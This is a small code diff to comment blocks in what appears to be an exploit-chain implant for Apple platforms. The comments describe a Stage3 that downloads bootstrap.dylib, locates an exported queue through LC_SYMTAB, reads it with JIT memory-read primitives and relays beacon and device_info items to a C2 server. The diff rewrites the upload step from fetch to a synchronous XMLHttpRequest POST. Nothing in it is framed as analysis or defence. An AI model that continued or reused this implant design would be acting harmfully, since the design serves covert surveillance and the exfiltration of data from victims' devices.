@@ -11,7 +11,7 @@
  * falls back to writing upload items into a static in-process queue.
  *
  * Optional: Stage3 may locate the exported symbols _g_cru_q_cnt and
- * _g_cru_q via the dylib's LC_SYMTAB after downloading code.dylib,
+ * _g_cru_q via the dylib's LC_SYMTAB after downloading bootstrap.dylib,
  * then read the queue with its JIT memory-read primitives after
  * _process() returns, and relay each item to C2.  If nothing reads the queue,
  * items remain unused — prefer Channel C success without touching JS.
@@ -42,7 +42,8 @@
  *   for i in 0..cnt:
  *     if ep.read32(g_cru_q[i].rdy_addr) == 1:
  *       read b64 string 4 bytes at a time
- *       fetch('/upload', {body: atob(b64)})
+ *       var _xhr=new XMLHttpRequest(); _xhr.open('POST','/upload',false);
+ *       _xhr.setRequestHeader('Content-Type','application/json'); _xhr.send(atob(b64))
  *
  * Capacity:
  *   CRU_Q_B64MAX = 1024  → fits ~750 B JSON (beacon, device_info, thread_start)
